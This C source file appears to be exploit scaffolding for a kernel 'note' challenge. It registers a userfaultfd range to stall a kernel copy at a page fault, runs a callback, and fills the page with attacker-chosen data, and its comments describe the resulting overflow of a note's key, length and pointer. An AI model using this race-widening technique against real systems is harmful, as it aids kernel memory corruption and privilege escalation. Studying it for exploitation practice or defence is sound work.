#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

#define PAGESIZE 0x1000

int userfaultfd(int flags) {
  return syscall(__NR_userfaultfd, flags);
}

int prepare_uffd(int pages, int memsize) {
  int fd = 0;
  if ((fd = userfaultfd(O_NONBLOCK)) == -1) {
    fprintf(stderr, "++ userfaultfd failed: %m\n");
    exit(-1);
  }
  /* When first opened the userfaultfd must be enabled invoking the
     UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API
     (or a later API version) which will specify the read/POLLIN protocol
     userland intends to speak on the UFFD and the uffdio_api.features
     userland requires. The UFFDIO_API ioctl if successful (i.e. if the
     requested uffdio_api.api is spoken also by the running kernel and the
     requested features are going to be enabled) will return into
     uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
     respectively all the available features of the read(2) protocol and
     the generic ioctl available. */
  struct uffdio_api api = { .api = UFFD_API };
  if (ioctl(fd, UFFDIO_API, &api)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
    exit(-1);
  }
  /* "Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl
     should be invoked (if present in the returned uffdio_api.ioctls
     bitmask) to register a memory range in the userfaultfd by setting the
     uffdio_register structure accordingly. The uffdio_register.mode
     bitmask will specify to the kernel which kind of faults to track for
     the range (UFFDIO_REGISTER_MODE_MISSING would track missing
     pages). The UFFDIO_REGISTER ioctl will return the uffdio_register
     . ioctls bitmask of ioctls that are suitable to resolve userfaults on
     the range registered. Not all ioctls will necessarily be supported
     for all memory types depending on the underlying virtual memory
     backend (anonymous memory vs tmpfs vs real filebacked mappings)." */
  if (api.api != UFFD_API) {
    fprintf(stderr, "++ unexepcted UFFD api version.\n");
    exit(-1);
  }
  /* mmap some pages, set them up with the userfaultfd. */
  struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = {
      .start = (long) pages,
      .len = memsize
    }
  };
  if (ioctl(fd, UFFDIO_REGISTER,  &reg)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
    exit(-1);
  }
  if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
    fprintf(stderr, "++ unexpected UFFD ioctls.\n");
    exit(-1);
  }
  return fd;
}

void handle_uf(int ufd, void *target, void (*callback)(), char *oob_buf) {
  /* handle page fault */
  struct pollfd evt = { .fd = ufd, .events = POLLIN };

  while (poll(&evt, 1, 10) > 0) {
    /* unexpected poll events */
    if (evt.revents & POLLERR) {
      perror("poll");
      exit(-1);
    } else if (evt.revents & POLLHUP) {
      perror("pollhup");
      exit(-1);
    }

    struct uffd_msg fault_msg = {0};
    if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
      perror("read");
      exit(-1);
    }

    char *place = (char *)fault_msg.arg.pagefault.address;
    if (fault_msg.event != UFFD_EVENT_PAGEFAULT
        || (place != target && place != target + PAGESIZE)) {
      fprintf(stderr, "unexpected pagefault?.\n");
      exit(-1);
    }

    if (place == target) {
      printf("[+] got page fault at address %p, nice!\n", place);

      callback();

      /* release by copying some data to faulting address */
      struct uffdio_copy copy = {
        .dst = (size_t) place,
        .src = (size_t) oob_buf,
        .len = 0x1000
      };
      if (ioctl(ufd, UFFDIO_COPY, &copy) < 0) {
        perror("ioctl(UFFDIO_COPY)");
        exit(-1);
      }

      /* now edit will overflow to 1, and key, length and ptr and contents of note1 will be altered by the overflow */
      /* overflow content = key ^ userprovided content */
      break;
    }
  }
}
